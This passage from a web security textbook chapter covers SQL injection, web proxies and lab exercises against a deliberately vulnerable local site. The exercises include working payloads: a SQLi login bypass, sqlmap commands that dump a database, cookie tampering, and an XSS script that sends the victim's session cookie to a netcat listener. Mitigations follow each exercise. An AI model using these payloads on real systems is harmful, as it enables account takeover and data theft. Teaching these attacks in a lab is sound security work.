>Reloading the malicious URL now renders the payload in the version parameter on the page without executing it.
>![[../images/09/activity_xss_fixed.png|Retesting Fixed Application|600]]

### Relational Databases
Web applications store, update and retrieve data from databases as part of the back-end system.  One such system, **relational database management systems (RDBMS)**, stores data in a manner similar to Microsoft's Excel where tables of rows and columns contain values within fields.  There are several flavors of relational databases that vary slightly in their syntax but are mostly similar.  Some of the most popular relational databases available today include MySQL, PostgreSQL, Oracle Database, and Microsoft SQL Server.  The web application establishes a connection with the SQL database server, sends SQL statements, and collects data responses that are used within the response to a client request.  

![[../images/09/sql_connection.png|Server Connection to DBMS|250]]

The image above illustrates a web server's connection to RDBMS while sending a SQL query.  The data in these systems is interacted with using *structured query language (SQL)*, pronounced "sequel", which is coded into the business logic of a web application.  SQL is a human friendly language that prides itself on its intuitive readability.  The following image taken from a MySQL server shows a database CLI query.  The query `select * from users` requests a selection of all data from the table named users.  

![[../images/09/sql_table.png|SQL Statement Showing Table Data|400]]

The output of the command in the image above lists a table with columns and rows showing the ID, username, password, and role of two users.  A row, also referred to as a tuple, represents a user in the system.  Organizing data this way enables the logical structure of data which can be requested or changed by a web application.  Once data is retrieved, or otherwise updated, the web application uses the values from the database in its business logic, as appropriate.  For instance, a user logging into a system may have their name retrieved from the database which is then used in the rendering of the logged in page as part of a welcome message.

The passing of SQL queries from a web server to a database is not without its risk.  If the query was manipulated by an attacker, in what is called a **SQL injection (SQLi)**, they could access data that they are not authorized to receive.  For example, an attacker that is able to retrieve the users table in its entirety would be a big security risk as they would have access to everyone's passwords.  To mitigate against this, most security focused web applications will hash the web application users' passwords before storing them in the database.  This prevents an attacker from ever obtaining all users plaintext passwords from the database.  But that is not enough to fully mitigate all the risk of SQLi as there may be other sensitive data available, or the attacker could even trick the system into logging them in using someone else's account.   Some misconfigured RDMBS combined with SQLi may even result in *remote code execution* exploits empowering the attacker to gain full system access.

SQLi vulnerabilities are the result of improper handling of untrusted input where a user-controlled string is dynamically inserted into a SQL query through the web application's business logic.  Such a setup would be benign if not for an attacker extending the SQL query with their own code.  SQL allows for conditions and other logical operators that can be abused in a SQLi attack.  Take the following vulnerable code snippet for authenticating a user as an example.

```php
$sql = "SELECT * FROM users WHERE username='".$_GET['username']."' AND password='".$_GET['password']."'";
```

This vulnerable line of code takes GET parameters and concatenates them into a query variable which will be passed to the DBMS.  Entering valid values for the parameters allows the application to function normally, but an attacker could inject SQL syntax and hijack the logic of the command.  For instance, if the attacker supplied `lol' OR 1=1-- -` as their username with this vulnerable code, they would be logged into the system without providing valid credentials!  This works because the apostrophe ends the username string in the query and the query's logic is extended with the OR operator.  The OR operator compares 1 with 1 which is designed to always return true.  The `-- -` is used to comment out the remainder of the query resulting in the final query being `SELECT * FROM users WHERE username='lol' OR 1=1-- -`.  The application's business logic would provide an affirmative response to its authentication check and log the malicious user into the application!

> [!activity] Activity 9.6 - SQL Injection
> You could have guessed that the Vulnerable Site application we have been demonstrating within this chapter is vulnerable to SQL injection attacks.  As explained above, we can leverage the vulnerability to log into the system without credentials.  But we can also use the vulnerability to extract all the data in the database.  Furthermore, the attack could be automated using a tool called `SQLMap` that will be demonstrated on my Kali VM.
> 
> Starting the Kali VM, Vulnerable Site application, and navigating to http://127.0.0.1/, I am once again presented with the login screen of my application.  If I provide invalid credentials I receive a friendly error message.
> ![[../images/09/sqli_activity_error.png|Bad Credentials Error Message]]
> Iterating on the SQLi vulnerability, I return to the login screen and provide `lol' OR 1=1-- -` as the username or password.  Hitting submit sends me to the authenticated Welcome Page!
> ![[../images/09/activity_sqli_welcome.png|SQLi Exploit Login|600]]
> I can expand this attack by dumping the entire database.  While this can be accomplished manually, it is much more efficient to use `SQLMap` to automate the task.  Kali has `SQLMap` installed by default, so I only need to point the tool at the vulnerable page to begin attacking it.  `SQLMap` will test every parameter with several injection tests and identify all the ways the application is vulnerable to SQLi.  I use the batch option to answer yes to any of `SQLMap`'s questions.
> ```bash
> sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch
> ```
> ![[../images/09/sqli_activity_initial_map.png|Initial SQLMap Scan of Index Page|600]]
> After a few moments, `SQLMap` finds that the username parameter is vulnerable to time-based blind SQL injection and the backend DBMS is MySQL.
> ![[../images/09/sqli_activity_timebased.png|SQLMap Initial Results|600]]
> I rerun the same `SQLMap` command using the `--dbs` option to identify what databases are within this MySQL DBMS.  `SQLMap` picks up where it left off and automatically uses the time-based blind injection vulnerability to extract the database names.  The time-based method is very slow as `SQLMap` has to guess each letter of every database name one at a time.  If the application responds slowly, it indicates whether the guessed letter is correct or not and then continues guessing the next letter until all database names are uncovered.
> ```bash
> sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch --dbs
> ```
> ![[../images/09/sqli_activity_dbs.png|Dumping Databases Using SQLMap|600]]
> After a few minutes, all database names are presented.  The schema, `mysql`, and `sys` databases are default databases used by MySQL to organize databases.  The `information_schema` database has a table where all the databases and tables are listed, which is what `SQLMap` uses to find the database names.  I see a database named company that looks interesting.
> ![[../images/09/sqli_activity_dbs_results.png|Discovered Databases by SQLMap|600]]
> To explore the tables within the company database I specify `-D company` and the `--dump` option.
> ```bash
> sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch -D company --dump
> ```
> ![[../images/09/sqli_activity_tables.png|Dumping Table Names From Company Database|600]]
> After a few minutes of SQL injections, SQLMap dumps the contents of the tables in the company database that includes usernames and passwords for all the accounts!
> ![[../images/09/sqli_activity_user_dump.png|Users Table Dumped By SQLMap|600]]

The SQLi vulnerabilities can be mitigated by using input validation techniques covered in the XSS section of this chapter.  However, it is not advisable to rely on input validation as sometimes the data needing to be passed into the RDMBS will require the use of valid SQL syntax.  Instead, queries should be crafted by web applications in a safe manner to ensure that user input will not be executed as part of the query.  The standard method of doing so is through *prepared statements*, which replace concatenated strings with question marks, while encoded variable values replace them while processing requests.  Major web programming languages have this functionality built-in, so developers are encouraged to use it rather than over relying on input validation.
### Web Proxy Tooling
The ability to capture inbound and outbound web traffic to inspect, modify and forward enables security researchers, attackers, and interested parties to examine how web applications operate between their web servers and clients.  These **web proxy tools**, installed client-side, use the browser's proxy settings to direct traffic through the tool.  They can be configured to even intercept TLS traffic by importing the proxying tool's certificate into the browser.

The most popular tools are PortSwigger's Burp Suite and OWASP's ZAP.  Burp Suite's community edition has many free features such as intercept, automations like brute forcing, and repeater, which allows for the quick resending of requests.  Burp Suite's Pro edition costs around $400 per year and removes built in throttles, includes a fantastic DAST scanner, web spider, and other features.  ZAP has these features all for free, but the interface is less appealing, at least in my opinion.  

Kali Linux has Burp Suite and ZAP preinstalled and can be launched from the applications menu.  Once the tool is started you can launch the built-in Chromium based browser *Burp browser* that already has the TLS certificate imported and is configured to run through the proxy tool.  Navigate to Target (tab), Site Map (sub tab) and press the Open Browser (button) to start a browser instance.  Opening a web site in the Burp browser starts capturing traffic that is logged and can be later analyzed.  The image below shows Burp browser on the right and the Burp Suite interface on the left.  The Burp Suite window displays captured requests and response in the bottom panes. 

![[../images/09/burp_proxy.png|BurpSuite Intercepting Traffic]]

These captured requests can be modified and replayed through the Repeater and Intruder features.  There are numerous features worth exploring on how to use Burp, along with a robust community that extends its capabilities through downloadable add-on extensions from the marketplace.  Anyone doing web application security testing is likely using a web proxy, such as ZAP or Burp, as they are very powerful tools that enrich the testing experience.


> [!tip] Tip - Free Web Application Security Labs
> Another service PortSwigger provides is their Academy, which has over one hundred free web application penetration testing labs that include a wide array of vulnerability classes spanning various difficulties.  The Academy even tracks your progress and is gamified with a leaderboard.  Readers interested in resources to practice their web application security skills should invest time in PortSwigger's Academy.  See https://portswigger.net/web-security for details.

## Exercises

>[!exercise] Exercise 9.1 - Directory Busting
>In this task, you will perform directory busting against a vulnerable web application running as a docker container on your Kali VM.
>#### Step 1 - Install Docker
>Run the following commands in a bash terminal and then restart your VM, if you do not already have Docker installed.
>```bash
>sudo apt update 
>sudo apt install -y docker.io 
>sudo usermod -aG docker $USER
>```
>#### Step 2 - Run Vulnerable-Site
>Clone the vulnerable-site repository on your Kali VM.
>```bash
>git clone https://github.com/dhammon/vulnerable-site
>```
>Change directory to vulnerable-site and run the vulnerable app as a docker container. Allow a few minutes for the image layers to download and the applications to start.
>```bash
>docker run -it -d -p "80:80" -v ${PWD}/app:/app --name vulnerable-site mattrayner/lamp:0.8.0-1804-php7
>
>```
>The container will run in the background but may need a few minutes to fully boot. After waiting a few minutes for the containers to load, run the db.sh script on the container to populate the application's database. If you receive an " `ERROR 2002 (HY000) `" it means you need to wait another minute for the container to fully boot.
>```bash
>docker exec vulnerable-site /bin/bash /app/db.sh
>```
>Open your Kali VM Firefox browser to [http://127.0.0.1](http://127.0.0.1/) and observe that the vulnerable-site application is running!
>#### Step 3 - Install Gobuster
>Install the `gobuster` package on your Kali VM.
>```bash
>sudo apt install gobuster -y
>```
>#### Step 4 - Directory Busting
>Start a directory busting attack against the vulnerable-site using `gobuster` and discover the `db.sh` script in the web root directory.
>```bash
>gobuster dir -u [http://127.0.0.1/](http://127.0.0.1/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 -x php,sh
>```
>After a few seconds, `gobuster` discovers the `db.sh` file! Open the Firefox browser in your Kali VM and navigate to the file [http://127.0.0.1/db.sh](http://127.0.0.1/db.sh). The file downloads from the container.  Open the file by clicking the download shortcut and observe that the file contents include username and passwords in the INSERT commands!
>
>From your Kali VM Firefox browser, navigate to the vulnerable-site's login page [http://127.0.0.1/](http://127.0.0.1/). Enter the administrator username and password found in the `db.sh` file.  Observe that the credentials were valid as the browser directs us to the Welcome Page, pwned!!
>


>[!exercise] Exercise 9.2 - Cookie Privesc
>Web applications could insecurely rely on cookie values to handle authorization decisions. You will identify and exploit a vulnerable application's cookie to escalate privileges in this task from your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 2 - Enumerate Cookies
>With the vulnerable-site running in your Kali VM, open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/). Login as the low privileged user (username=daniel and password=Password123).
>
>Open the developer console (F12), select the Storage tab, Cookies (left navigation tree), and select the [http://127.0.0.1](http://127.0.0.1/) site. Observe that there is a cookie called "role" with a value of "user".
>#### Step 3 - Escalate Privileges
>With the "role" cookie identified in the developer console, double click the cookie value ("user") and replace the value with the word "administrator" then press enter.
>
>Reload the page with the new cookie value and navigate to the Administrator Page to confirm full access.
>#### Step 4 - Remediate Vulnerable Cookie
>Trusting cookie values, especially for authorization purposes, can lead to privilege escalations. A better approach would be to place authorization variables server side in sessions. Launch a bash terminal in the Kali VM and open the `index.php` file using nano. Observe that the cookie is set in line 14's `setcookie` function call.
>```bash
>nano ~/vulnerable-site/app/index.php
>```
>With the `index.php` file open, replace the `setcookie` line with a line that sets the role as a session variable. Press CTRL+X, Y for yes, and Enter to save the file changes.
>```php
>$_SESSION['role'] = $role;
>```
>Open the `admin.php` file in nano and inspect its contents. Observe the cookie "role" is used to check if the requestor is an administrator and will present the privileged content.
>```bash
>nano ~/vulnerable-site/app/admin.php
>```
>Replace admin.php's line magic variable $\_COOKIE with the magic variable $\_SESSION that was set in the index.php file. Press CTRL+X, Y for yes, and Enter to save the file.
>```php
>if($_SESSION['role'] == 'administrator') {
>```
>Launch a new Firefox instance, navigate to [http://127.0.0.1/](http://127.0.0.1/), login as the low privilege user (username=daniel and password=Password123). Inspect the cookies and confirm that the role cookie is no longer in use!


>[!exercise] Exercise 9.3 - Cross Site Scripting (XSS)
>You will discover and exploit an XSS vulnerability in the vulnerable-site to steal the administrator's session cookie from within your Kali VM.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify XSS
>With the vulnerable-site running in your Kali VM, launch a Firefox instance and navigate to [http://127.0.0.1/](http://127.0.0.1/). 
>
>Open the source code of the login page by right clicking anywhere on the page and selecting "View Page Source" from the context menu.
>
>A new tab opens displaying HTML code that includes a hidden form value "version" with the value "beta".
>
>Return to the login page and enter the known credentials for the low privileged user (username=daniel and password=Password123). Entering the correct credentials logs you onto the Welcome Page.
>
>Observe that the page has a footer displaying the version as "beta". In addition, observe that the URL includes a parameter "`&version=beta`". Change the value for the version parameter in the URL bar to "`foobar`" and press enter to load the page with the new value.
>```
>http://127.0.0.1/?username=daniel&password=Password123&version=foobar
>```
>
>Observe that the GET parameter `version` reflects your input! Replace the "`foobar`" value with the test XSS payload "`<script>alert(1)</script>`" and press enter to reload the page. 
>```
>http://127.0.0.1/?username=daniel&password=Password123&version=<script>alert(1)</script>
>```
>
>Observe that a JavaScript alert box executed! Press Ok in the alert box to finish loading the page.
>#### Step 4 - Stage the Attack
>You will craft a malicious payload that sends the admin user's cookie value to an attacker-controlled server. The following payload creates an image object sourced from a remote server. The remote server is your attacker-controlled URL that has the victim user's cookie appended to it.
>```
><script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>
>```
>
>This payload includes special characters that the browser will interpret, change, and break. Therefore, you will use the URL encoded version.
>```
>%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
>```
>This payload replaces the GET parameter version value in the following link. The following link will be sent to the victim admin user with an enticing message to lure them into clicking it while logged into the vulnerable-site.
>```
>http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
>```
>Next, set up the attacker server. Open a bash terminal and run a `netcat` listener that will capture the request and cookie when the victim clicks on the link. Observe that the `netcat` listener remains open awaiting a connection.
>```bash
>nc -lp 9001
>```
>#### Step 5 - Trigger the Attack
>Open a new non-private Firefox browser and navigate to [http://127.0.0.1/](http://127.0.0.1/). This browser session will be used to simulate the victim's activity.
>
>Log in as the admin user (username=admin and password=SuperSecret1!).
>
>In the same Firefox window where the victim is logged into the vulnerable application, open a new Firefox browser tab and paste the malicious link in the URL bar and press enter. Observe the page loads as normal. This simulates the victim clicking on the link in an email or instant message, for example.
>```
>http://127.0.0.1/home.php?version=%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F127.0.0.1%3A9001%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
>```
>
>Navigate to the attacker terminal with the `netcat` listener set up in the previous step. Observe that the received connection includes the cookie value from the victim!  The `PHPSESSID` cookie value is the session identifier used by the web application to identify logged in users. With this token, the attacker can access authenticated pages as the victim!
>#### Step 6 - Mitigate the Vulnerability
>In a Kali VM bash terminal, open the `footer.php` file in the vulnerable-site/app directory using `nano` text editor.
>```bash
>nano ~/vulnerable-site/app/home.php
>```
>Observe the last line renders the version from the supplied GET parameter without any input validation or output encoding. Update the last line by wrapping the `$_GET['version']` in the `htmlspecialchars` function. Press CTRL+X, Y for yes, and Enter to save over the exiting file.
>```php
>echo "Version: ".htmlspecialchars($_GET['version']);
>```
>Open Firefox and navigate to [http://127.0.0.1/](http://127.0.0.1/). Enter the username and password (username=daniel and password=Password123) to log into the application.
>
>Replace the previously vulnerable GET parameter "`version`" value of "`beta`" with our XSS test payload "`<script>alert('xss')</script>`" and press enter. Observe this time that the page loads without the alert popup window and instead displays the payload as raw text!
>


>[!exercise] Exercise 9.4 - SQL Injection (SQLi)
>Bypass authentication controls by exploiting a SQL injection vulnerability. Then dump the Users table from the database using `SQLmap`.
>#### Step 1 - Install Docker
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 1 for instructions.
>#### Step 2 - Install Vulnerable-Site
>This step should not be needed if Exercise 9.1 was already completed; otherwise, refer to Exercise 9.1 - Step 2 for instructions.
>#### Step 3 - Identify SQLi
>With the vulnerable-site running in your Kali VM, navigate to [http://127.0.0.1/](http://127.0.0.1/) and enter an incorrect username and password combination. Observe that the error message "Wrong username/password" is displayed.
>#### Step 4 - Manual SQLi Exploitation
>Return to the vulnerable-site login page. Enter the following payload as the username and password and press the submit button. Observe that the application logs us in as the administrator!
>
>`lol' OR 1=1-- -`
>Explain why this payload logged you into the application.
>#### Step 5 - Automated SQLi with SQLMap
>Return to the vulnerable-site's login page and enter any incorrect username and password. Observe the "Wrong username/password" message. Copy the URL to your clipboard to use in the `sqlmap` tool.
>
>`http://127.0.0.1/?username=lol&password=lol&version=beta 
>
>Open a bash terminal and run `sqlmap` against the URL you just copied.
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch
>```
>Allow a minute for the tool to complete its analysis. Observe that `sqlmap` discovered that the application is vulnerable to time-based blind injection attacks!
>
>Enumerate the database names using the `--dbs` flag. Observe `sqlmap` slowly identifies each letter of each database name. After a few minutes, the databases `mysql`, `information_schema`, `performance_schema`, `sys`, and `company` are identified!
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch --dbs
>```
>The database `company` looks interesting. Run `sqlmap` targeting that database and dump all tables within it. 
>```bash
>sqlmap -u ' [http://127.0.0.1/?username=lol&password=lol&version=beta](http://127.0.0.1/?username=lol&password=lol&version=beta)' --batch -D company --dump
>```


[^1]: A03 Injection; OWASP Top 10.2021; March 10th 2024; https://owasp.org/Top10/A03_2021-Injection/
[^2]: CWE - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection') (4.14); MITRE CWE; March 10th 2024; https://cwe.mitre.org/data/definitions/77.html
[^3]: WSTG - Stable; Testing for Command Injection; OWASP Foundation; March 10th 2024; https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
[^4]: Google Advanced Search; Google; March 10th 2024; https://www.google.com/advanced_search
[^5]:Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon; Exploit Database; March 10th 2024; https://www.exploit-db.com/google-hacking-database
[^6]: aboul3la/Sublist3r: Fast subdomains enumeration tool for penetration testers; GitHub; March 13 2024; https://github.com/aboul3la/Sublist3r
